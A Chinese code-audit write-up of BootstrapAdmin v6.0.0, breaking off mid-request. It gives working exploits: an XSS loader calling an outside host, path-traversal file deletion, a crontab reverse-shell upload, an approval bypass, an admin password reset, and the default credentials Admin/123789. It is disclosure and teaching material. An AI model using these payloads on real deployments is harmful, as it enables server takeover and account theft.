0x00 前言
=======

BootstrapAdmin 是基于 RBAC 的 Net7 后台管理框架。该项目获得GVP 奖杯并拥有1w+Star。  
本篇文章中的所有发现的相关漏洞已提交 Issues 或通知仓库拥有者本人。此前审计过PHP、JAVA的CMS，这次尝试审计使用.NET Core开发的Web网站。  
这个不是传统的.NET WEB FRAMEWORK，因此我们没有看到项目中存在的Asp、Aspx等动态网页文件。紧随我的脚步，让我们一起感受代码审计的魅力。

> .Net Framework 和 .Net Core 都包含了ASP.net，但是.Net Core中的ASP.net被重新设计过了，目前没有看到Web Form这个功能，只看到了MVC这个功能。

<https://gitee.com/LongbowEnterprise/BootstrapAdmin>

0x01 声明
=======

公网上存在部署了旧版本的CMS，旧版本仍然存在这些问题。  
请不要非法攻击别人的服务器，如果你是服务器主人请升级到最新版本。  
请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。  
一切未经授权的网络攻击均为违法行为，互联网非法外之地。

0x02 环境
=======

BootstrapAdmin 版本：v6.0.0 MVC模式  
.Net SDK版本：5.0.408  
系统环境：Window10/CentOS7  
数据库：SQLite 数据库/Mysql8数据库

0x03 安装
=======

为了更好的测试，我分别在window和Linux上搭建了项目。  
下面的教程是在 Centos7 版本上部署的教程。Window部署作者给出了[教程](https://gitee.com/LongbowEnterprise/BootstrapAdmin/wikis/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B?sort_id=1333477)。

1、拉取项目源代码
---------

```python
mkdir /home/project
cd /home/project
git clone https://gitee.com/LongbowEnterprise/BootstrapAdmin.git -b v6.0.0
```

2、安装.NET SDK
------------

官方教程：<https://learn.microsoft.com/zh-cn/dotnet/core/install/linux-centos>

### 你可以选择在线安装（比较慢）

```php
rpm -Uvh https://packages.microsoft.com/config/centos/7/packages-microsoft-prod.rpm
yum install -y dotnet-sdk-5.0 git wget net-tools
```

### 本地下载上传压缩包

我使用的是dotnet-sdk-5.0的，其他版本可以在  
<https://dotnet.microsoft.com/zh-cn/download/dotnet>  
找到。手动安装的官方教程地址：  
<https://learn.microsoft.com/zh-cn/dotnet/core/install/linux-scripted-manual#manual-install>  
dotnet-sdk-5.0下载地址：  
<https://download.visualstudio.microsoft.com/download/pr/904da7d0-ff02-49db-bd6b-5ea615cbdfc5/966690e36643662dcc65e3ca2423041e/dotnet-sdk-5.0.408-linux-x64.tar.gz>  
我推荐上传到 `/opt` 目录下，如果你上传到了不同的目录，请修改下面的cd命令。

```python
cd /opt
DOTNET_FILE=dotnet-sdk-5.0.408-linux-x64.tar.gz
export DOTNET_ROOT=$(pwd)/.dotnet
mkdir -p "$DOTNET_ROOT" && tar zxf "$DOTNET_FILE" -C "$DOTNET_ROOT"
export PATH=$PATH:$DOTNET_ROOT:$DOTNET_ROOT/tools
```

代码执行完成后。可以通过`dotnet --list-sdks`命令检查是否安装完毕。

3、配置Nginx 反向代理
--------------

### 01 安装Nginx

```python
yum install -y wget
cd /usr/local
wget http://nginx.org/download/nginx-1.19.8.tar.gz
yum install -y gcc-c++ pcre pcre-devel zlib  zlib-devel openssl openssl-devel
tar -zxvf nginx-1.19.8.tar.gz
cd /usr/local/nginx-1.19.8/
./configure --with-http_ssl_module
make
make install
ln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx -f
```

### 02 配置Nginx

执行使用命令 `vi /usr/local/nginx/conf/nginx.conf`进行编辑配置文件。  
这里参考：  
<https://gitee.com/LongbowEnterprise/BootstrapAdmin/wikis/Nginx%20%E9%85%8D%E7%BD%AE>  
我省略了其中443的部分，因为测试环境无需用到。

```python
#user  nobody;
worker_processes  1;

#error_log  logs/error.log;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;

#pid        logs/nginx.pid;

events {
    worker_connections  1024;
}

http{
    include       mime.types;
    default_type  application/octet-stream;

    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
    #                  '$status $body_bytes_sent "$http_referer" '
    #                  '"$http_user_agent" "$http_x_forwarded_for"';

    #access_log  logs/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    #gzip  on;

    upstream ba {
        server localhost:50852;
    }

    server {
        listen       80;
        server_name  localhost;
        error_page 404 500 /50x.html;
        proxy_redirect  off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        location / {
            proxy_connect_timeout  1;
            proxy_pass http://ba/;
        }
        location /NotiHub  {
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_pass http://ba/NotiHub;
        }
        location /TaskLogHub  {
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_pass http://ba/TaskLogHub;
        }
        location = /50x.html {
            root   html;
        }
        error_page  404 500 502 503 504  /50x.html;
    }

    server {
        listen       8080;
        server_name  localhost;
        error_page 404 500 /50x.html;
        proxy_redirect  off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        location / {
            proxy_connect_timeout  1;
            proxy_pass http://client/;
        }
        location = /50x.html {
            root   html;
        }
        error_page  404 500 502 503 504  /50x.html;
    } 

    upstream client {
        server localhost:49185;
    }    
}
```

### 03 启动Nginx

测试配置正确与否：`/usr/local/nginx/sbin/nginx -t`  
运行nginx:：`/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf`  
重新加载：`/usr/local/nginx/sbin/nginx -s reload`

4、启动项目
------

```python
cd /home/project/BootstrapAdmin
export DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1
nohup dotnet run --project ./src/mvc/admin/Bootstrap.Admin &
nohup dotnet run --project ./src/mvc/client/Bootstrap.Client &
```

启动后任然无法访问，需要关闭防火墙：

```python
systemctl disable firewalld
systemctl stop firewalld
```

启动后访问`http://localhost:50852/Account/Login`即可

5、更换数据库
-------

我这里使用的可视化管理Mysql工具为`DBeaver`  
先在本地Mysql服务创建一个命名为BA的数据库。注意选择一下字符集`utf8mb4_general_ci`。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-09fe407a0ab35dd810f06dda766e82bd8c21862b.png)

创建完数据库后，我们先将`BootstrapAdmin\db\MySQL`目录下的`initData.sql`  
在第一行添加`set character set utf8mb4;`  
如果不做这一步，在后续操作会无法恢复该文件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-2490eb27bcc025484b208c5f58dd9af6cd4292f8.png)

修改完后右键数据库选择恢复数据库。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-7996e099d6c43cff3222fd064675bbfd87d6521c.png)

通过这个功能分别导入两个sql文件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-1d59027ba2066608c9bdbe8f01586f5f566d44bb.png)

修改配置文件应用Mysql服务。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\appsettings.json`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-78a814ef30be82f56ea3769244aacb738f2e7b5f.png)

`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\appsettings.Development.json`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-523360f6e376437407ad34f8ef47aa533feeb8d3.png)

重新生成后出现以下错误。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-15546e9a3dd25284494e6d94dc40fdfc5b55ebdd.png)

在Visual Studio帮助旁边的搜索栏搜索 Nuget

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3251bb2204fea87ba74108e2b61897a6a4c397da.png)

在弹出的窗口选择`游览`，搜索Mysql，下载安装`Mysql.Data 8.029`这个版本。  
因为最新版本不支持.Net5.0。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-92f72a27c8833cf2413a9d6acf4d07552da85ea0.png)

安装完毕后重新生成启动即可。

0x04 代码审计
=========

【前台】错误返回页面存在反射型XSS（无Cookie）
---------------------------

### 漏洞利用

经典的 a 标签 href 属性XSS注入，使用简单 payload：`javascript:alert(8007)`  
点击返回首页时可以触发Script脚本。  
请求路径：`http://localhost:50852/Home/Error/404?ReturnUrl=`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6155985a47e7cfe560cda444d6e65848d087cf5c.png)

使用 xssye.com 构造利用方式。  
`javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly94c3N5ZS5jb20vejNxVyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs='))`  
参考：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-839485308b731839fade883f19ac004219c3c7f7.png)

当我们点击返回首页时执行了我们的跨站脚本，可以在xssye.com后台中看到数据，但是没有获取到Cookie。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-7705ec10c17cc116d7ed3a71d2454151a66ce4fc.png)

Cookie都有 HttpOnly 所以获取不到。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-60a9623a01fba07373b19eeaea194a0f0fcc614f.png)

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\HomeController.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8f5b42ff3394af5f369f0864cbb48014fbee00f8.png)

这里的 returnUrl 是通过Request Query获取的，也就是GET方式请求获取Query数据。  
`Request.Query[CookieAuthenticationDefaults.ReturnUrlParameter].ToString();`  
对应的`cshtml`文件  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Views\Shared\Error.cshtml`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-502bdcb400d3b44b733499fdc4aa8f41e47bffb0.png)

> `@Url.Content` 方法返回一个应用程序中的虚拟路径的绝对 URL。它可以用于生成包含应用程序根路径的 URL，这对于在视图中使用相对路径引用 CSS、JavaScript 和图像等文件非常有用。  
> 在 Razor 视图中，默认情况下会进行 HTML 实体编码，以避免跨站点脚本攻击。这意味着在模型属性的值插入到 HTML 中时，会自动将特殊字符（如 &lt;, &gt;, &amp; 等）转换成对应的 HTML 实体编码。

【后台】头像任意文件删除
------------

权限：后台普通用户权限

### 漏洞利用

为了测试，我现在目录`BootstrapAdmin\src`下新建命名为`don't_delete_me.txt`的文件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b2ec04f44c098dcb5f6affefab721f4e273b552a.png)

使用管理员默认账户登录后台：Admin/123789  
访问：`http://localhost:50852/Admin/Profiles`  
在左侧栏找到个人中心，进入后找到修改头像处。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3a685a5d7729b71cd9f0121c5aa7f51a2f8ca90f.png)

任意上传一张图像，然后点击删除。抓包修改包的内容。  
头像存储的相对路径是`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\wwwroot\images\uploader`  
将 key 修改成`\..\..\..\..\..\..\don't_delete_me.txt`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b9a84b277679fdd8eaa6edabb4b89d1507391d00.png)

请求包：

```php
POST http://localhost:50852/api/Profiles/Delete HTTP/1.1
Host: localhost:50852
Content-Length: 42
sec-ch-ua: "Chromium";v="89", ";Not A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Profiles
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8PEsgr_mSMxFurYJD90kTRdDutnyswhgQAajLp51T2b4dYv1uTICnGVL5VbVaPJDUc3r70GoHtQB2Vj7oYm-nLhDCG9W_mj5-8IB2FhB271EWYmMSylfSZlNpTFa3Bjf2r_UhJSfp1Bd5BPtXwzV6_I; .AspNetCore.Cookies=CfDJ8PEsgr_mSMxFurYJD90kTRfdrk0fKJRgNBBGJh87RD57SJijn1hT9IhdiA0zf0iJmcS8FhwRVuJ0vRc_TtyVbrYpbGm_YrC8ZzLRK9P8u4AZImRchxPy9WBPUhMMx1p9xex3eUomUXRKzT5yx12qpn93BDSxLApgseVLQLucY5kAtph1GMb1V17dFqbe0ieA99eoYMLFYT_KBcncZFdFE7cAUAJWj0msoM8Uwb9aRSXaVdqklQvxohYvXa0zEFcUSzKpbJbYWIGYDMzW3WJvehlx6i8nDEneQaHVeR801qSl
Connection: close

key=\..\..\..\..\..\..\don't_delete_me.txt
```

我在Linux系统上创建了delete\_me.txt文件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6a069b090b905ba8db1dd0433fdfc8cea49276bd.png)

通过使用 payload`/../../../../../../../../delete_me.txt`将文件删除了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6681a18514e6bb371dcb1a09b8b2bd34240288f7.png)

报错是因为我修改了全局的头像路径不用理会。那么有人可能问了，如果修改了字典里的头像路径为什么还能删除我们指定的文件呢？  
原因是它是这么拼接的：  
`fileName = Path.Combine(env.WebRootPath, $"images{Path.DirectorySeparatorChar}uploader{Path.DirectorySeparatorChar}{fileName}");`  
直接写死了`images/uploader`而不是通过字典获取路径。具体的代码在下面可以看到。

### 漏洞定位

请求路径为`http://localhost:50852/api/Profiles/Delete`  
后端处理文件为：  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\ProfilesController.cs`  
对`api/Profiles`的Post请求就会进入到这个函数，它的请求格式为`api/Profiles/{id}`  
这里先对id进行了判断，然后获取我们传入的Key。这里的`[FromForm] DeleteFileCollection files`已经将请求body的参数转换成`DeleteFileCollection`对象了，所以`files.Key`就是我们输入的`\..\..\..\..\..\..\don't_delete_me.txt`。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-575b28da681b191b5955f4081d14bbcb9fd03b2a.png)

> `Path.Combine` 函数用于将字符串组合成文件或目录路径。它是一种安全的连接路径的方式，因为它会自动添加正确的目录分隔符。但是，需要注意的是，Path.Combine不会验证或清理输入路径。开发人员有责任确保输入路径是安全的，不包含任何恶意或意外字符。

这里没有对拼接的路径进行任何过滤，所以我们可以进行目录遍历删除文件。

【后台】头像任意文件上传
------------

权限：后台普通用户权限

### 漏洞利用

使用管理员默认账户登录后台：Admin/123789  
访问`http://localhost:50852/Admin/Users`  
新建一个名为 root 的账户，密码随意，也不需要给权限。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c596fd5570456de26fa3be8e1bc327bd9b80bcad.png)

然后进入字典表维护`http://localhost:50852/Admin/Dicts`  
在字典代码输入`~/../../../../../../../../../var/spool/cron/`  
这里的`../`多少无所谓主要是要跳到根目录，其次注意的是Ubuntu的计划任务目录在  
`/var/spool/cron/crontabs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-f772bfcb9dde9aeafa12425cea31b0eefd75f067.png)

我们退出Admin账户，重新登录root账户，然后到个人中心处上传图片后抓包。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-be66f7493c4502e33ef094f42021a8e8b3b664c5.png)

```php
Content-Disposition: form-data; name="file_data"; filename="."
Content-Type: image/jpeg

* * * * * bash -i >& /dev/tcp/192.168.68.1/6666  0>&1%0a
```

需要注意的是我们需要将`%0a`进行URL编码解码发包才可以。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e4aa7e5ec54da3e7acab007e8ebeedc8b83b6f5d.png)

解码之后发送请求。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cdc79a629a39ccc51a91afc88cad257f251f3e10.png)

到测试服务器上查看，发现已经写入。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8a77d2fc83bf979c9b5298f4cadc115737f3a0a8.png)

Windows 开 nc 监听等待一分钟也能连上，至此成功Getshell。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a59d8a6d2e765fab17c35a5cc451fd34d910b312.png)

### 漏洞定位

`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\ProfilesController.cs`  
这里的 fileName 是使用当前用户名拼接上传文件的 filename 得来的，所以我们在上传文件的时候修改后缀 .asp 即可上传木马文件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-da04f014b27a91e95523b9f2db36e93791b9ea77.png)

为什么无法解析呢？我们往下看。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Startup.cs`  
app.UseStaticFiles() 中间件默认配置为从“wwwroot”目录提供文件服务。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3aaa4111d3acf3821b8d6274faa21bbea3074ec5.png)

设置了这个中间件去访问动态文件 asp 时会因为`app.UseStatusCodePagesWithReExecute("/Home/Error/{0}");`返回`/Home/Error/404`的界面。  
访问：`http://localhost:50852/Admin/Profiles`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-95208c4ec2e3559a8310ca62a8981d9bcfbce8e3.png)

找到修改头像，选择一句话木马后上传，抓包修改后缀名为 asp 放包即可。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-61c9e8e78c543e838fcbd40f44b9240a85ee8bdb.png)

可以看到文件已经上传成功了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cbf292cbb2133853e294916cf1beea42e6c7bc00.png)

虽然文件上传成功，但很可惜，无法解析。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d15457b4b953da8516cf2fe95851559214a2cf4f.png)

我注意到`fileName = $"{userName}{Path.GetExtension(uploadFile.FileName)}";`  
路径拼接中使用了`userName`，那我可以尝试通过修改用户名来达到目录穿越的目的。  
更新用户名，`PUT http://localhost:50852/api/Profiles`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-266003920517d7c3e957f283e2cc069abc0d2b29.png)

很可惜存在 UserName与 当前登录用户名进行判断，我们没办法通过这个判断。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\ProfilesController.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a3e1e628860f9c56d2f6cfb6b9e07fbbcfbe0326.png)

还有一个地方可以编辑，那就是用户管理。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-7cdbf2d3ba9be292f17f5183f0371932c9fca696.png)

抓包修改之后修改UserName，但是实际上没有修改成功。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-fe5fe0578aca4f85793ffc84e8cee1b3b1587ae9.png)

这里没有使用到我们的 UserName，但我们可以新建一个账户。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\UsersController.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5fd17cfcfbd375b6eaaa9a58ac09d77b745fd987.png)

随意创建一个用户。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-06bef995500a4c211d8dbb0d6871e53ea6772c31.png)

修改请求中的 UserName

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-70dff2c0a189f1c723d90f9733811d01577e87c5.png)

`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\UsersController.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5fc9b01d50fb577e2027a810e072740e70ba824c.png)

进入到 UserHelper.Save  
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ea88f1bb4755261d048df27cbb9aaedc78f8a32c.png)

继续进入到 UserHelper.UserChecker，其中针对我们传入的 UserName 进行了长度限制和正则匹配。很显然我们输入的`..\\..\\..\\..\\`没法通过匹配。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-64f4e9df5090c158386efbc79d4da57b5b81b826.png)

我将注意力放到 `webSiteUrl`  
`var filePath = Path.Combine(env.WebRootPath, webSiteUrl.Replace("~", string.Empty).Replace('/', Path.DirectorySeparatorChar).TrimStart(Path.DirectorySeparatorChar) + fileName);`  
这是最终拼接路径的语句，其中的`webSiteUrl`是通过字典获取的。  
`var webSiteUrl = DictHelper.RetrieveIconFolderPath();`  
我们到字典表维护功能，就可以找到头像路径的设置。  
`http://localhost:50852/Admin/Dicts`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3f598baf234718ee4ac72d96426d2ded61408fae.png)

将字典代码内容修改成`~/../../../../../../../`。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-2f34569a4924e2e70cc835829c7a91a09848e367.png)

这个时候我们再次上传就可以看到路径已经拼接好了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8c510253c0538845ec4f2b11bed5d91b0a0811fd.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-2c6af5afbc67badf6c9c12dc8976d82d46e87304.png)

在 Windows 情况下，我们没有办法通过上传木马GetShell。有人就要问了，覆盖报错页面的 cshtml 就可以了。想法很好，但很可惜，在ASP.NET Core应用程序中，cshtml文件是视图文件，用于呈现HTML内容。这些文件通常在应用程序启动时被编译，并在运行时作为静态文件提供。因此，在程序运行时修改cshtml文件是不可能的。

> Cmd 临时开启 UTF-8编码，可以使用命令 `chcp 65001`。  
> 参考 <https://learnku.com/articles/55553>

我在Linux上传计划任务时卡了一会，因为**crontab的文件要以换行符结尾**。否则没法执行计划任务。但如果直接换行或者Shift+Enter（输入\\r\\n）结果是`^M`。

> ^M 是一个特殊的字符，也称为回车符或者Carriage Return符号。它通常表示为\\r。  
> 当在Windows中使用文本编辑器或其他工具编辑文件时，该文件的行结束符可能会以回车符(\\r)和换行符(\\n)的组合表示。在Linux和Unix系统中，行结束符通常只是一个换行符(\\n)。  
> 在计划任务语句中，如果包含回车符(\\r)，它会被解释为一个命令或参数的一部分，可能会导致计划任务执行失败。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-23c0e39d8a8240addfb56aea4bb6dc2f0d2b5495.png)

所以我想到需要编辑Hex，而BurpSuite2020及之后版本都没法直观的编辑Hex。  
官方给的说明如下（Google翻译过后的）

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-4a800ec7d2733f19da9b8647d855fe637d128bec.png)

> 可以通过链接直达该官方说明：<https://portswigger.net/burp/documentation/desktop/tools/inspector/modify-requests>

也就是先添加一个字符，然后选中，再通过右侧小部件编辑。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8cf5e2cb9b5ae9938b56ce1fda31f779f957441e.png)

但是我试了一下还是不行，不如直接使用`%0a`URL解码一下就行了。

【前台】越权添加账户
----------

### 漏洞利用

访问登录界面`http://localhost:50852/Account/Login`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e5f81805b19f2f4ec059a5f7b970eb725038e7b4.png)

点击申请账号，任意填写内容后点击提交并抓包。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-778e1adfa4ef12732a86c279c595d9da2948a62e.png)

修改请求包，添加两项内容：

```python
"ApprovedTime":"2023-05-04 18:44:20.9316203",
"ApprovedBy":"system"
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3eb50ba0e730190b660fd663695e2c1c2ffdf0fa.png)

请求包：

```python
POST /api/Register HTTP/1.1
Host: localhost:50852
Content-Length: 150
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Account/Login?AppId=BA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNbJjshI1qzQp5CuMqbXtCMkdL2neNZavWmBhuthWZKWz33fafGSx248iRpmB60ypJVZklddoKZx_r5WUEYb6NlFnr8NezIO2vRdhVD2dAcFCSwZJTQffPO8V4Ua3hJC-90
Connection: close

{"UserName":"test","Password":"123456","DisplayName":"test","Description":"test",
"ApprovedTime":"2023-05-04 18:44:20.9316203","ApprovedBy":"system"}
```

放包后，我们可以使用管理员账号在后台查看用户相关数据。发现已经添加成功。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-65f32ddb32d1751f27e20b22f4363363bfce6ef1.png)

使用我们刚刚注册的账号进行登录。可以看到能够登录，也就是说**绕过了注册账号需要管理员通过的操作**

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-4b86f92f1283dc9ec023160f9b6a6a832a6e2a4a.png)

可以看到是 test 账户，现在是默认权限的状态。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-40797810dbf66f53e0aa7100bc29b6f09d41269e.png)

当我访问 `http://localhost:50852/api/Users?search=&sort=RegisterTime&order=desc&offset=0&limit=20&name=&displayName=&_=1683257070879`时可以获取所有用户的用户相关信息。这个功能当前用户应当没有权限，只有管理员有用户管理的面板。属于**越权**操作了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5ad2c0f34dbe15b1a8fa804fb9e93ded2890a6d5.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c771190d63eab6b53b29ba588dbe8eb7d1dba78e.png)

### 漏洞定位

我们在请求`http://localhost:50852/api/Register`时会先进入到：  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\Api\RegisterController.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-7c0dcbf0a267bb63fc0f0aff219eec1d7a9c9f78.png)

进入到`UserHelper.Save`函数  
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`  
这里进行了三个判断：

1. 判断输入的用户数据是否符合标准 UserChecker
2. 根据输入的用户名判断用户是否已经存在
3. 判断是否是演示系统，如果是演示系统就根据输入ID判断用户是否已经存在。显然这里不是演示系统。

我们输入用户名是不存在的且符合标准，所以进入到保存操作。  
`DbContextManager.Create<User>()?.Save(user)`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e14826434c5145d5733c21a61d5161506175e7df.png)

`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`  
到这里直接通过`db.Insert`操作将我们传入的所有数据进行了保存操作。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-82744d2f289b6cbcaee71a43ca7f3a6dbcb42738.png)

那么为什么我们添加了`ApprovedTime`和`ApprovedBy`就可以登录了呢？我们去看看登录控制器。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Controllers\AccountController.cs`  
这里存在用户爆破漏洞，因为没有进行验证码校验，不过不是我们目前漏洞的重点。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-19312df29f400be3714f735a850a517053601117.png)

只要用户名和密码不为空就进入到 `UserHelper.Authenticate`。  
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Helper\UserHelper.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-49611e342193c399dc4cf7bed2146235017d291e.png)

这里进入到`Authenticate`函数  
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e9dcc07dd29a982fe27576a5a611a80fd32643d9.png)

可以看到这里的查询语句条件中忽略了`ApprovedTime`为空的用户数据，所以只要我们添加了`ApprovedTime`就可以登录。

【前台】任意重置密码
----------

### 漏洞利用

进入到后台登录页面`http://localhost:50852/Account/Login`

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ca5c1d330a460443e76efe663d69a533f4af473e.png)

进入到忘记密码界面，账号处输入`Admin`即默认管理员账户登录名称，其他字段信息随意填写。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-94864cbde534f3823690f5614c4799d1d614bad1.png)

我们提交之后再发送一个重置密码的包即可，这个包不需要任何权限。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6804487f9d75df0691fb87859de1e55a5a7f3b98.png)

请求包：

```python
PUT /api/Register/Admin HTTP/1.1
Host: localhost:50852
Content-Length: 21
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Account/Login?AppId=BA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
